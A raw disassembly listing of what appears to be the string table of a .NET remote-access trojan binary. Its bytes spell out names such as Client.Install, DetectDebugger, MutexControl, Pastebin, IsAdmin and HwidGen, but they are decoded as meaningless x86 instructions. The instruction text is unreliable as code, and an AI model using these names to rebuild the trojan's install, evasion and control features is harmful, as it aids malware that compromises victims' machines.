  408703:	6c                   	insb   (%dx),%es:(%edi)
  408704:	00 41 72             	add    %al,0x72(%ecx)
  408707:	65 45                	gs inc %ebp
  408709:	71 75                	jno    0x408780
  40870b:	61                   	popa
  40870c:	6c                   	insb   (%dx),%es:(%edi)
  40870d:	00 67 65             	add    %ah,0x65(%edi)
  408710:	74 5f                	je     0x408771
  408712:	49                   	dec    %ecx
  408713:	6e                   	outsb  %ds:(%esi),(%dx)
  408714:	74 65                	je     0x40877b
  408716:	72 76                	jb     0x40878e
  408718:	61                   	popa
  408719:	6c                   	insb   (%dx),%es:(%edi)
  40871a:	00 73 65             	add    %dh,0x65(%ebx)
  40871d:	74 5f                	je     0x40877e
  40871f:	49                   	dec    %ecx
  408720:	6e                   	outsb  %ds:(%esi),(%dx)
  408721:	74 65                	je     0x408788
  408723:	72 76                	jb     0x40879b
  408725:	61                   	popa
  408726:	6c                   	insb   (%dx),%es:(%edi)
  408727:	00 43 6c             	add    %al,0x6c(%ebx)
  40872a:	69 65 6e 74 2e 49 6e 	imul   $0x6e492e74,0x6e(%ebp),%esp
  408731:	73 74                	jae    0x4087a7
  408733:	61                   	popa
  408734:	6c                   	insb   (%dx),%es:(%edi)
  408735:	6c                   	insb   (%dx),%es:(%edi)
  408736:	00 6b 65             	add    %ch,0x65(%ebx)
  408739:	72 6e                	jb     0x4087a9
  40873b:	65 6c                	gs insb (%dx),%es:(%edi)
  40873d:	33 32                	xor    (%edx),%esi
  40873f:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  408742:	6c                   	insb   (%dx),%es:(%edi)
  408743:	00 75 73             	add    %dh,0x73(%ebp)
  408746:	65 72 33             	gs jb  0x40877c
  408749:	32 2e                	xor    (%esi),%ch
  40874b:	64 6c                	fs insb (%dx),%es:(%edi)
  40874d:	6c                   	insb   (%dx),%es:(%edi)
  40874e:	00 6e 74             	add    %ch,0x74(%esi)
  408751:	64 6c                	fs insb (%dx),%es:(%edi)
  408753:	6c                   	insb   (%dx),%es:(%edi)
  408754:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  408757:	6c                   	insb   (%dx),%es:(%edi)
  408758:	00 4b 69             	add    %cl,0x69(%ebx)
  40875b:	6c                   	insb   (%dx),%es:(%edi)
  40875c:	6c                   	insb   (%dx),%es:(%edi)
  40875d:	00 50 6f             	add    %dl,0x6f(%eax)
  408760:	6c                   	insb   (%dx),%es:(%edi)
  408761:	6c                   	insb   (%dx),%es:(%edi)
  408762:	00 57 72             	add    %dl,0x72(%edi)
  408765:	69 74 65 4e 75 6c 6c 	imul   $0x6c6c75,0x4e(%ebp,%eiz,2),%esi
  40876c:	00 
  40876d:	53                   	push   %ebx
  40876e:	65 74 41             	gs je  0x4087b2
  408771:	73 4e                	jae    0x4087c1
  408773:	75 6c                	jne    0x4087e1
  408775:	6c                   	insb   (%dx),%es:(%edi)
  408776:	00 4d 75             	add    %cl,0x75(%ebp)
  408779:	74 65                	je     0x4087e0
  40877b:	78 43                	js     0x4087c0
  40877d:	6f                   	outsl  %ds:(%esi),(%dx)
  40877e:	6e                   	outsb  %ds:(%esi),(%dx)
  40877f:	74 72                	je     0x4087f3
  408781:	6f                   	outsl  %ds:(%esi),(%dx)
  408782:	6c                   	insb   (%dx),%es:(%edi)
  408783:	00 45 6e             	add    %al,0x6e(%ebp)
  408786:	63 6f 64             	arpl   %ebp,0x64(%edi)
  408789:	65 32 53 74          	xor    %gs:0x74(%ebx),%dl
  40878d:	72 65                	jb     0x4087f4
  40878f:	61                   	popa
  408790:	6d                   	insl   (%dx),%es:(%edi)
  408791:	00 46 69             	add    %al,0x69(%esi)
  408794:	6c                   	insb   (%dx),%es:(%edi)
  408795:	65 53                	gs push %ebx
  408797:	74 72                	je     0x40880b
  408799:	65 61                	gs popa
  40879b:	6d                   	insl   (%dx),%es:(%edi)
  40879c:	00 4e 65             	add    %cl,0x65(%esi)
  40879f:	74 77                	je     0x408818
  4087a1:	6f                   	outsl  %ds:(%esi),(%dx)
  4087a2:	72 6b                	jb     0x40880f
  4087a4:	53                   	push   %ebx
  4087a5:	74 72                	je     0x408819
  4087a7:	65 61                	gs popa
  4087a9:	6d                   	insl   (%dx),%es:(%edi)
  4087aa:	00 53 73             	add    %dl,0x73(%ebx)
  4087ad:	6c                   	insb   (%dx),%es:(%edi)
  4087ae:	53                   	push   %ebx
  4087af:	74 72                	je     0x408823
  4087b1:	65 61                	gs popa
  4087b3:	6d                   	insl   (%dx),%es:(%edi)
  4087b4:	00 44 65 63          	add    %al,0x63(%ebp,%eiz,2)
  4087b8:	6f                   	outsl  %ds:(%esi),(%dx)
  4087b9:	64 65 46             	fs gs inc %esi
  4087bc:	72 6f                	jb     0x40882d
  4087be:	6d                   	insl   (%dx),%es:(%edi)
  4087bf:	53                   	push   %ebx
  4087c0:	74 72                	je     0x408834
  4087c2:	65 61                	gs popa
  4087c4:	6d                   	insl   (%dx),%es:(%edi)
  4087c5:	00 43 72             	add    %al,0x72(%ebx)
  4087c8:	79 70                	jns    0x40883a
  4087ca:	74 6f                	je     0x40883b
  4087cc:	53                   	push   %ebx
  4087cd:	74 72                	je     0x408841
  4087cf:	65 61                	gs popa
  4087d1:	6d                   	insl   (%dx),%es:(%edi)
  4087d2:	00 47 5a             	add    %al,0x5a(%edi)
  4087d5:	69 70 53 74 72 65 61 	imul   $0x61657274,0x53(%eax),%esi
  4087dc:	6d                   	insl   (%dx),%es:(%edi)
  4087dd:	00 4d 65             	add    %cl,0x65(%ebp)
  4087e0:	6d                   	insl   (%dx),%es:(%edi)
  4087e1:	6f                   	outsl  %ds:(%esi),(%dx)
  4087e2:	72 79                	jb     0x40885d
  4087e4:	53                   	push   %ebx
  4087e5:	74 72                	je     0x408859
  4087e7:	65 61                	gs popa
  4087e9:	6d                   	insl   (%dx),%es:(%edi)
  4087ea:	00 50 72             	add    %dl,0x72(%eax)
  4087ed:	6f                   	outsl  %ds:(%esi),(%dx)
  4087ee:	67 72 61             	addr16 jb 0x408852
  4087f1:	6d                   	insl   (%dx),%es:(%edi)
  4087f2:	00 67 65             	add    %ah,0x65(%edi)
  4087f5:	74 5f                	je     0x408856
  4087f7:	49                   	dec    %ecx
  4087f8:	74 65                	je     0x40885f
  4087fa:	6d                   	insl   (%dx),%es:(%edi)
  4087fb:	00 67 65             	add    %ah,0x65(%edi)
  4087fe:	74 5f                	je     0x40885f
  408800:	49                   	dec    %ecx
  408801:	73 36                	jae    0x408839
  408803:	34 42                	xor    $0x42,%al
  408805:	69 74 4f 70 65 72 61 	imul   $0x74617265,0x70(%edi,%ecx,2),%esi
  40880c:	74 
  40880d:	69 6e 67 53 79 73 74 	imul   $0x74737953,0x67(%esi),%ebp
  408814:	65 6d                	gs insl (%dx),%es:(%edi)
  408816:	00 43 6c             	add    %al,0x6c(%ebx)
  408819:	69 65 6e 74 2e 41 6c 	imul   $0x6c412e74,0x6e(%ebp),%esp
  408820:	67 6f                	outsl  %ds:(%si),(%dx)
  408822:	72 69                	jb     0x40888d
  408824:	74 68                	je     0x40888e
  408826:	6d                   	insl   (%dx),%es:(%edi)
  408827:	00 53 79             	add    %dl,0x79(%ebx)
  40882a:	6d                   	insl   (%dx),%es:(%edi)
  40882b:	6d                   	insl   (%dx),%es:(%edi)
  40882c:	65 74 72             	gs je  0x4088a1
  40882f:	69 63 41 6c 67 6f 72 	imul   $0x726f676c,0x41(%ebx),%esp
  408836:	69 74 68 6d 00 41 73 	imul   $0x79734100,0x6d(%eax,%ebp,2),%esi
  40883d:	79 
  40883e:	6d                   	insl   (%dx),%es:(%edi)
  40883f:	6d                   	insl   (%dx),%es:(%edi)
  408840:	65 74 72             	gs je  0x4088b5
  408843:	69 63 41 6c 67 6f 72 	imul   $0x726f676c,0x41(%ebx),%esp
  40884a:	69 74 68 6d 00 48 61 	imul   $0x73614800,0x6d(%eax,%ebp,2),%esi
  408851:	73 
  408852:	68 41 6c 67 6f       	push   $0x6f676c41
  408857:	72 69                	jb     0x4088c2
  408859:	74 68                	je     0x4088c3
  40885b:	6d                   	insl   (%dx),%es:(%edi)
  40885c:	00 54 72 69          	add    %dl,0x69(%edx,%esi,2)
  408860:	6d                   	insl   (%dx),%es:(%edi)
  408861:	00 52 61             	add    %dl,0x61(%edx)
  408864:	6e                   	outsb  %ds:(%esi),(%dx)
  408865:	64 6f                	outsl  %fs:(%esi),(%dx)
  408867:	6d                   	insl   (%dx),%es:(%edi)
  408868:	00 49 43             	add    %cl,0x43(%ecx)
  40886b:	72 79                	jb     0x4088e6
  40886d:	70 74                	jo     0x4088e3
  40886f:	6f                   	outsl  %ds:(%esi),(%dx)
  408870:	54                   	push   %esp
  408871:	72 61                	jb     0x4088d4
  408873:	6e                   	outsb  %ds:(%esi),(%dx)
  408874:	73 66                	jae    0x4088dc
  408876:	6f                   	outsl  %ds:(%esi),(%dx)
  408877:	72 6d                	jb     0x4088e6
  408879:	00 4d 73             	add    %cl,0x73(%ebp)
  40887c:	67 50                	addr16 push %eax
  40887e:	61                   	popa
  40887f:	63 6b 45             	arpl   %ebp,0x45(%ebx)
  408882:	6e                   	outsb  %ds:(%esi),(%dx)
  408883:	75 6d                	jne    0x4088f2
  408885:	00 57 72             	add    %dl,0x72(%edi)
  408888:	69 74 65 42 6f 6f 6c 	imul   $0x656c6f6f,0x42(%ebp,%eiz,2),%esi
  40888f:	65 
  408890:	61                   	popa
  408891:	6e                   	outsb  %ds:(%esi),(%dx)
  408892:	00 54 6f 42          	add    %dl,0x42(%edi,%ebp,2)
  408896:	6f                   	outsl  %ds:(%esi),(%dx)
  408897:	6f                   	outsl  %ds:(%esi),(%dx)
  408898:	6c                   	insb   (%dx),%es:(%edi)
  408899:	65 61                	gs popa
  40889b:	6e                   	outsb  %ds:(%esi),(%dx)
  40889c:	00 53 65             	add    %dl,0x65(%ebx)
  40889f:	74 41                	je     0x4088e2
  4088a1:	73 42                	jae    0x4088e5
  4088a3:	6f                   	outsl  %ds:(%esi),(%dx)
  4088a4:	6f                   	outsl  %ds:(%esi),(%dx)
  4088a5:	6c                   	insb   (%dx),%es:(%edi)
  4088a6:	65 61                	gs popa
  4088a8:	6e                   	outsb  %ds:(%esi),(%dx)
  4088a9:	00 48 77             	add    %cl,0x77(%eax)
  4088ac:	69 64 47 65 6e 00 6c 	imul   $0x656c006e,0x65(%edi,%eax,2),%esp
  4088b3:	65 
  4088b4:	6e                   	outsb  %ds:(%esi),(%dx)
  4088b5:	00 63 68             	add    %ah,0x68(%ebx)
  4088b8:	69 6c 64 72 65 6e 00 	imul   $0x4d006e65,0x72(%esp,%eiz,2),%ebp
  4088bf:	4d 
  4088c0:	61                   	popa
  4088c1:	69 6e 00 58 35 30 39 	imul   $0x39303558,0x0(%esi),%ebp
  4088c8:	43                   	inc    %ebx
  4088c9:	68 61 69 6e 00       	push   $0x6e6961
  4088ce:	63 68 61             	arpl   %ebp,0x61(%eax)
  4088d1:	69 6e 00 41 70 70 44 	imul   $0x44707041,0x0(%esi),%ebp
  4088d8:	6f                   	outsl  %ds:(%esi),(%dx)
  4088d9:	6d                   	insl   (%dx),%es:(%edi)
  4088da:	61                   	popa
  4088db:	69 6e 00 67 65 74 5f 	imul   $0x5f746567,0x0(%esi),%ebp
  4088e2:	43                   	inc    %ebx
  4088e3:	75 72                	jne    0x408957
  4088e5:	72 65                	jb     0x40894c
  4088e7:	6e                   	outsb  %ds:(%esi),(%dx)
  4088e8:	74 44                	je     0x40892e
  4088ea:	6f                   	outsl  %ds:(%esi),(%dx)
  4088eb:	6d                   	insl   (%dx),%es:(%edi)
  4088ec:	61                   	popa
  4088ed:	69 6e 00 50 61 73 74 	imul   $0x74736150,0x0(%esi),%ebp
  4088f4:	65 62 69 6e          	bound  %ebp,%gs:0x6e(%ecx)
  4088f8:	00 49 73             	add    %cl,0x73(%ecx)
  4088fb:	41                   	inc    %ecx
  4088fc:	64 6d                	fs insl (%dx),%es:(%edi)
  4088fe:	69 6e 00 4a 6f 69 6e 	imul   $0x6e696f4a,0x0(%esi),%ebp
  408905:	00 47 65             	add    %al,0x65(%edi)
  408908:	74 46                	je     0x408950
  40890a:	69 6c 65 4e 61 6d 65 	imul   $0x57656d61,0x4e(%ebp,%eiz,2),%ebp
  408911:	57 
  408912:	69 74 68 6f 75 74 45 	imul   $0x78457475,0x6f(%eax,%ebp,2),%esi
  408919:	78 
  40891a:	74 65                	je     0x408981
  40891c:	6e                   	outsb  %ds:(%esi),(%dx)
  40891d:	73 69                	jae    0x408988
  40891f:	6f                   	outsl  %ds:(%esi),(%dx)
  408920:	6e                   	outsb  %ds:(%esi),(%dx)
  408921:	00 67 65             	add    %ah,0x65(%edi)
  408924:	74 5f                	je     0x408985
  408926:	4f                   	dec    %edi
  408927:	53                   	push   %ebx
  408928:	56                   	push   %esi
  408929:	65 72 73             	gs jb  0x40899f
  40892c:	69 6f 6e 00 53 79 73 	imul   $0x73795300,0x6e(%edi),%ebp
  408933:	74 65                	je     0x40899a
  408935:	6d                   	insl   (%dx),%es:(%edi)
  408936:	2e 49                	cs dec %ecx
  408938:	4f                   	dec    %edi
  408939:	2e 43                	cs inc %ebx
  40893b:	6f                   	outsl  %ds:(%esi),(%dx)
  40893c:	6d                   	insl   (%dx),%es:(%edi)
  40893d:	70 72                	jo     0x4089b1
  40893f:	65 73 73             	gs jae 0x4089b5
  408942:	69 6f 6e 00 41 70 70 	imul   $0x70704100,0x6e(%edi),%ebp
  408949:	6c                   	insb   (%dx),%es:(%edi)
  40894a:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  408951:	00 53 79             	add    %dl,0x79(%ebx)
  408954:	73 74                	jae    0x4089ca
  408956:	65 6d                	gs insl (%dx),%es:(%edi)
  408958:	2e 53                	cs push %ebx
  40895a:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  40895e:	69 74 79 2e 41 75 74 	imul   $0x68747541,0x2e(%ecx,%edi,2),%esi
  408965:	68 
  408966:	65 6e                	outsb  %gs:(%esi),(%dx)
  408968:	74 69                	je     0x4089d3
  40896a:	63 61 74             	arpl   %esp,0x74(%ecx)
  40896d:	69 6f 6e 00 53 79 73 	imul   $0x73795300,0x6e(%edi),%ebp
  408974:	74 65                	je     0x4089db
  408976:	6d                   	insl   (%dx),%es:(%edi)
  408977:	2e 52                	cs push %edx
  408979:	65 66 6c             	gs data16 insb (%dx),%es:(%edi)
  40897c:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  408981:	6e                   	outsb  %ds:(%esi),(%dx)
  408982:	00 58 35             	add    %bl,0x35(%eax)
  408985:	30 39                	xor    %bh,(%ecx)
  408987:	43                   	inc    %ebx
  408988:	65 72 74             	gs jb  0x4089ff
  40898b:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  408992:	43                   	inc    %ebx
  408993:	6f                   	outsl  %ds:(%esi),(%dx)
  408994:	6c                   	insb   (%dx),%es:(%edi)
  408995:	6c                   	insb   (%dx),%es:(%edi)
  408996:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  40899b:	6e                   	outsb  %ds:(%esi),(%dx)
  40899c:	00 4d 61             	add    %cl,0x61(%ebp)
  40899f:	6e                   	outsb  %ds:(%esi),(%dx)
  4089a0:	61                   	popa
  4089a1:	67 65 6d             	gs insl (%dx),%es:(%di)
  4089a4:	65 6e                	outsb  %gs:(%esi),(%dx)
  4089a6:	74 4f                	je     0x4089f7
  4089a8:	62 6a 65             	bound  %ebp,0x65(%edx)
  4089ab:	63 74 43 6f          	arpl   %esi,0x6f(%ebx,%eax,2)
  4089af:	6c                   	insb   (%dx),%es:(%edi)
  4089b0:	6c                   	insb   (%dx),%es:(%edi)
  4089b1:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4089b6:	6e                   	outsb  %ds:(%esi),(%dx)
  4089b7:	00 43 6c             	add    %al,0x6c(%ebx)
  4089ba:	69 65 6e 74 2e 43 6f 	imul   $0x6f432e74,0x6e(%ebp),%esp
  4089c1:	6e                   	outsb  %ds:(%esi),(%dx)
  4089c2:	6e                   	outsb  %ds:(%esi),(%dx)
  4089c3:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4089c8:	6e                   	outsb  %ds:(%esi),(%dx)
  4089c9:	00 73 65             	add    %dh,0x65(%ebx)
  4089cc:	74 5f                	je     0x408a2d
  4089ce:	50                   	push   %eax
  4089cf:	6f                   	outsl  %ds:(%esi),(%dx)
  4089d0:	73 69                	jae    0x408a3b
  4089d2:	74 69                	je     0x408a3d
  4089d4:	6f                   	outsl  %ds:(%esi),(%dx)
  4089d5:	6e                   	outsb  %ds:(%esi),(%dx)
  4089d6:	00 70 6f             	add    %dh,0x6f(%eax)
  4089d9:	73 69                	jae    0x408a44
  4089db:	74 69                	je     0x408a46
  4089dd:	6f                   	outsl  %ds:(%esi),(%dx)
  4089de:	6e                   	outsb  %ds:(%esi),(%dx)
  4089df:	00 43 72             	add    %al,0x72(%ebx)
  4089e2:	79 70                	jns    0x408a54
  4089e4:	74 6f                	je     0x408a55
  4089e6:	67 72 61             	addr16 jb 0x408a4a
  4089e9:	70 68                	jo     0x408a53
  4089eb:	69 63 45 78 63 65 70 	imul   $0x70656378,0x45(%ebx),%esp
  4089f2:	74 69                	je     0x408a5d
  4089f4:	6f                   	outsl  %ds:(%esi),(%dx)
  4089f5:	6e                   	outsb  %ds:(%esi),(%dx)
  4089f6:	00 41 72             	add    %al,0x72(%ecx)
  4089f9:	67 75 6d             	addr16 jne 0x408a69
  4089fc:	65 6e                	outsb  %gs:(%esi),(%dx)
  4089fe:	74 4e                	je     0x408a4e
  408a00:	75 6c                	jne    0x408a6e
  408a02:	6c                   	insb   (%dx),%es:(%edi)
  408a03:	45                   	inc    %ebp
  408a04:	78 63                	js     0x408a69
  408a06:	65 70 74             	gs jo  0x408a7d
  408a09:	69 6f 6e 00 41 72 67 	imul   $0x67724100,0x6e(%edi),%ebp
  408a10:	75 6d                	jne    0x408a7f
  408a12:	65 6e                	outsb  %gs:(%esi),(%dx)
  408a14:	74 45                	je     0x408a5b
  408a16:	78 63                	js     0x408a7b
  408a18:	65 70 74             	gs jo  0x408a8f
  408a1b:	69 6f 6e 00 55 6e 6b 	imul   $0x6b6e5500,0x6e(%edi),%ebp
  408a22:	6e                   	outsb  %ds:(%esi),(%dx)
  408a23:	6f                   	outsl  %ds:(%esi),(%dx)
  408a24:	77 6e                	ja     0x408a94
  408a26:	00 49 6d             	add    %cl,0x6d(%ecx)
  408a29:	61                   	popa
  408a2a:	67 65 43             	addr16 gs inc %ebx
  408a2d:	6f                   	outsl  %ds:(%esi),(%dx)
  408a2e:	64 65 63 49 6e       	fs arpl %ecx,%gs:0x6e(%ecx)
  408a33:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a35:	00 53 65             	add    %dl,0x65(%ebx)
  408a38:	6e                   	outsb  %ds:(%esi),(%dx)
  408a39:	64 49                	fs dec %ecx
  408a3b:	6e                   	outsb  %ds:(%esi),(%dx)
  408a3c:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a3e:	00 46 69             	add    %al,0x69(%esi)
  408a41:	6c                   	insb   (%dx),%es:(%edi)
  408a42:	65 49                	gs dec %ecx
  408a44:	6e                   	outsb  %ds:(%esi),(%dx)
  408a45:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a47:	00 44 72 69          	add    %al,0x69(%edx,%esi,2)
  408a4b:	76 65                	jbe    0x408ab2
  408a4d:	49                   	dec    %ecx
  408a4e:	6e                   	outsb  %ds:(%esi),(%dx)
  408a4f:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a51:	00 46 69             	add    %al,0x69(%esi)
  408a54:	6c                   	insb   (%dx),%es:(%edi)
  408a55:	65 53                	gs push %ebx
  408a57:	79 73                	jns    0x408acc
  408a59:	74 65                	je     0x408ac0
  408a5b:	6d                   	insl   (%dx),%es:(%edi)
  408a5c:	49                   	dec    %ecx
  408a5d:	6e                   	outsb  %ds:(%esi),(%dx)
  408a5e:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a60:	00 43 6f             	add    %al,0x6f(%ebx)
  408a63:	6d                   	insl   (%dx),%es:(%edi)
  408a64:	70 75                	jo     0x408adb
  408a66:	74 65                	je     0x408acd
  408a68:	72 49                	jb     0x408ab3
  408a6a:	6e                   	outsb  %ds:(%esi),(%dx)
  408a6b:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a6d:	00 43 53             	add    %al,0x53(%ebx)
  408a70:	68 61 72 70 41       	push   $0x41707261
  408a75:	72 67                	jb     0x408ade
  408a77:	75 6d                	jne    0x408ae6
  408a79:	65 6e                	outsb  %gs:(%esi),(%dx)
  408a7b:	74 49                	je     0x408ac6
  408a7d:	6e                   	outsb  %ds:(%esi),(%dx)
  408a7e:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a80:	00 50 72             	add    %dl,0x72(%eax)
  408a83:	6f                   	outsl  %ds:(%esi),(%dx)
  408a84:	63 65 73             	arpl   %esp,0x73(%ebp)
  408a87:	73 53                	jae    0x408adc
  408a89:	74 61                	je     0x408aec
  408a8b:	72 74                	jb     0x408b01
  408a8d:	49                   	dec    %ecx
  408a8e:	6e                   	outsb  %ds:(%esi),(%dx)
  408a8f:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a91:	00 57 72             	add    %dl,0x72(%edi)
  408a94:	69 74 65 4d 61 70 00 	imul   $0x50007061,0x4d(%ebp,%eiz,2),%esi
  408a9b:	50 
  408a9c:	72 65                	jb     0x408b03
  408a9e:	76 65                	jbe    0x408b05
  408aa0:	6e                   	outsb  %ds:(%esi),(%dx)
  408aa1:	74 53                	je     0x408af6
  408aa3:	6c                   	insb   (%dx),%es:(%edi)
  408aa4:	65 65 70 00          	gs gs jo 0x408aa8
  408aa8:	5a                   	pop    %edx
  408aa9:	69 70 00 63 75 72 72 	imul   $0x72727563,0x0(%eax),%esi
  408ab0:	65 6e                	outsb  %gs:(%esi),(%dx)
  408ab2:	74 41                	je     0x408af5
  408ab4:	70 70                	jo     0x408b26
  408ab6:	00 4d 69             	add    %cl,0x69(%ebp)
  408ab9:	63 72 6f             	arpl   %esi,0x6f(%edx)
  408abc:	73 6f                	jae    0x408b2d
  408abe:	66 74 2e             	data16 je 0x408aef
  408ac1:	43                   	inc    %ebx
  408ac2:	53                   	push   %ebx
  408ac3:	68 61 72 70 00       	push   $0x707261
  408ac8:	47                   	inc    %edi
  408ac9:	72 6f                	jb     0x408b3a
  408acb:	75 70                	jne    0x408b3d
  408acd:	00 4e 6f             	add    %cl,0x6f(%esi)
  408ad0:	72 6d                	jb     0x408b3f
  408ad2:	61                   	popa
  408ad3:	6c                   	insb   (%dx),%es:(%edi)
  408ad4:	53                   	push   %ebx
  408ad5:	74 61                	je     0x408b38
  408ad7:	72 74                	jb     0x408b4d
  408ad9:	75 70                	jne    0x408b4b
  408adb:	00 53 79             	add    %dl,0x79(%ebx)
  408ade:	73 74                	jae    0x408b54
  408ae0:	65 6d                	gs insl (%dx),%es:(%edi)
  408ae2:	2e 4c                	cs dec %esp
  408ae4:	69 6e 71 00 43 6c 65 	imul   $0x656c4300,0x71(%esi),%ebp
  408aeb:	61                   	popa
  408aec:	72 00                	jb     0x408aee
  408aee:	43                   	inc    %ebx
  408aef:	68 61 72 00 49       	push   $0x49007261
  408af4:	6e                   	outsb  %ds:(%esi),(%dx)
  408af5:	76 6f                	jbe    0x408b66
  408af7:	6b 65 4d 65          	imul   $0x65,0x4d(%ebp),%esp
  408afb:	6d                   	insl   (%dx),%es:(%edi)
  408afc:	62 65 72             	bound  %esp,0x72(%ebp)
  408aff:	00 4d 44             	add    %cl,0x44(%ebp)
  408b02:	35 43 72 79 70       	xor    $0x70797243,%eax
  408b07:	74 6f                	je     0x408b78
  408b09:	53                   	push   %ebx
  408b0a:	65 72 76             	gs jb  0x408b83
  408b0d:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  408b14:	69 64 65 72 00 52 53 	imul   $0x41535200,0x72(%ebp,%eiz,2),%esp
  408b1b:	41 
  408b1c:	43                   	inc    %ebx
  408b1d:	72 79                	jb     0x408b98
  408b1f:	70 74                	jo     0x408b95
  408b21:	6f                   	outsl  %ds:(%esi),(%dx)
  408b22:	53                   	push   %ebx
  408b23:	65 72 76             	gs jb  0x408b9c
  408b26:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  408b2d:	69 64 65 72 00 41 65 	imul   $0x73654100,0x72(%ebp,%eiz,2),%esp
  408b34:	73 
  408b35:	43                   	inc    %ebx
  408b36:	72 79                	jb     0x408bb1
  408b38:	70 74                	jo     0x408bae
  408b3a:	6f                   	outsl  %ds:(%esi),(%dx)
  408b3b:	53                   	push   %ebx
  408b3c:	65 72 76             	gs jb  0x408bb5
  408b3f:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  408b46:	69 64 65 72 00 53 74 	imul   $0x72745300,0x72(%ebp,%eiz,2),%esp
  408b4d:	72 
  408b4e:	69 6e 67 42 75 69 6c 	imul   $0x6c697542,0x67(%esi),%ebp
  408b55:	64 65 72 00          	fs gs jb 0x408b59
  408b59:	49                   	dec    %ecx
  408b5a:	6e                   	outsb  %ds:(%esi),(%dx)
  408b5b:	73 74                	jae    0x408bd1
  408b5d:	61                   	popa
  408b5e:	6c                   	insb   (%dx),%es:(%edi)
  408b5f:	6c                   	insb   (%dx),%es:(%edi)
  408b60:	46                   	inc    %esi
  408b61:	6f                   	outsl  %ds:(%esi),(%dx)
  408b62:	6c                   	insb   (%dx),%es:(%edi)
  408b63:	64 65 72 00          	fs gs jb 0x408b67
  408b67:	49                   	dec    %ecx
  408b68:	64 53                	fs push %ebx
  408b6a:	65 6e                	outsb  %gs:(%esi),(%dx)
  408b6c:	64 65 72 00          	fs gs jb 0x408b70
  408b70:	73 65                	jae    0x408bd7
  408b72:	6e                   	outsb  %ds:(%esi),(%dx)
  408b73:	64 65 72 00          	fs gs jb 0x408b77
  408b77:	4d                   	dec    %ebp
  408b78:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  408b7f:	74 2e                	je     0x408baf
  408b81:	43                   	inc    %ebx
  408b82:	53                   	push   %ebx
  408b83:	68 61 72 70 2e       	push   $0x2e707261
  408b88:	52                   	push   %edx
  408b89:	75 6e                	jne    0x408bf9
  408b8b:	74 69                	je     0x408bf6
  408b8d:	6d                   	insl   (%dx),%es:(%edi)
  408b8e:	65 42                	gs inc %edx
  408b90:	69 6e 64 65 72 00 43 	imul   $0x43007265,0x64(%esi),%ebp
  408b97:	61                   	popa
  408b98:	6c                   	insb   (%dx),%es:(%edi)
  408b99:	6c                   	insb   (%dx),%es:(%edi)
  408b9a:	53                   	push   %ebx
  408b9b:	69 74 65 42 69 6e 64 	imul   $0x65646e69,0x42(%ebp,%eiz,2),%esi
  408ba2:	65 
  408ba3:	72 00                	jb     0x408ba5
  408ba5:	47                   	inc    %edi
  408ba6:	65 74 45             	gs je  0x408bee
  408ba9:	6e                   	outsb  %ds:(%esi),(%dx)
  408baa:	63 6f 64             	arpl   %ebp,0x64(%edi)
  408bad:	65 72 00             	gs jb  0x408bb0
  408bb0:	67 65 74 5f          	addr16 gs je 0x408c13
  408bb4:	42                   	inc    %edx
  408bb5:	75 66                	jne    0x408c1d
  408bb7:	66 65 72 00          	data16 gs jb 0x408bbb
  408bbb:	73 65                	jae    0x408c22
  408bbd:	74 5f                	je     0x408c1e
  408bbf:	42                   	inc    %edx
  408bc0:	75 66                	jne    0x408c28
  408bc2:	66 65 72 00          	data16 gs jb 0x408bc6
  408bc6:	57                   	push   %edi
  408bc7:	72 69                	jb     0x408c32
  408bc9:	74 65                	je     0x408c30
  408bcb:	49                   	dec    %ecx
  408bcc:	6e                   	outsb  %ds:(%esi),(%dx)
  408bcd:	74 65                	je     0x408c34
  408bcf:	67 65 72 00          	addr16 gs jb 0x408bd3
  408bd3:	67 65 74 5f          	addr16 gs je 0x408c36
  408bd7:	41                   	inc    %ecx
  408bd8:	73 49                	jae    0x408c23
  408bda:	6e                   	outsb  %ds:(%esi),(%dx)
  408bdb:	74 65                	je     0x408c42
  408bdd:	67 65 72 00          	addr16 gs jb 0x408be1
  408be1:	73 65                	jae    0x408c48
  408be3:	74 5f                	je     0x408c44
  408be5:	41                   	inc    %ecx
  408be6:	73 49                	jae    0x408c31
  408be8:	6e                   	outsb  %ds:(%esi),(%dx)
  408be9:	74 65                	je     0x408c50
  408beb:	67 65 72 00          	addr16 gs jb 0x408bef
  408bef:	47                   	inc    %edi
  408bf0:	65 74 41             	gs je  0x408c34
  408bf3:	73 49                	jae    0x408c3e
  408bf5:	6e                   	outsb  %ds:(%esi),(%dx)
  408bf6:	74 65                	je     0x408c5d
  408bf8:	67 65 72 00          	addr16 gs jb 0x408bfc
  408bfc:	53                   	push   %ebx
  408bfd:	65 74 41             	gs je  0x408c41
  408c00:	73 49                	jae    0x408c4b
  408c02:	6e                   	outsb  %ds:(%esi),(%dx)
  408c03:	74 65                	je     0x408c6a
  408c05:	67 65 72 00          	addr16 gs jb 0x408c09
  408c09:	44                   	inc    %esp
  408c0a:	65 74 65             	gs je  0x408c72
  408c0d:	63 74 44 65          	arpl   %esi,0x65(%esp,%eax,2)
  408c11:	62 75 67             	bound  %esi,0x67(%ebp)
  408c14:	67 65 72 00          	addr16 gs jb 0x408c18
  408c18:	4d                   	dec    %ebp
  408c19:	61                   	popa
  408c1a:	6e                   	outsb  %ds:(%esi),(%dx)
  408c1b:	61                   	popa
